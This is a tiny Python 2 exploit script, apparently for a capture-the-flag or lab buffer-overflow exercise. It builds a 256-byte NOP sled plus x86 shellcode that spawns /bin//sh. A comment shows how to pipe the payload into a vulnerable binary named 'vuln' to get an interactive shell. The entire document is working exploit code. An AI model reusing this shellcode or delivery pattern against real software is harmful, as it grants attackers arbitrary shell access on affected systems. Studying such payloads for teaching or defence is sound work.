#!/usr/bin/python

# A random offset between 0 and 256 is chosen as the start of the buffer. 
# Fill the first 256 bytes with a nop sled that will guarantee the shellcode
# will be executed.
# 
# (python exploit.py; cat -) | ./vuln

nopsled = "\x90" * 256
shellcode_x86 = "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

print nopsled + shellcode_x86
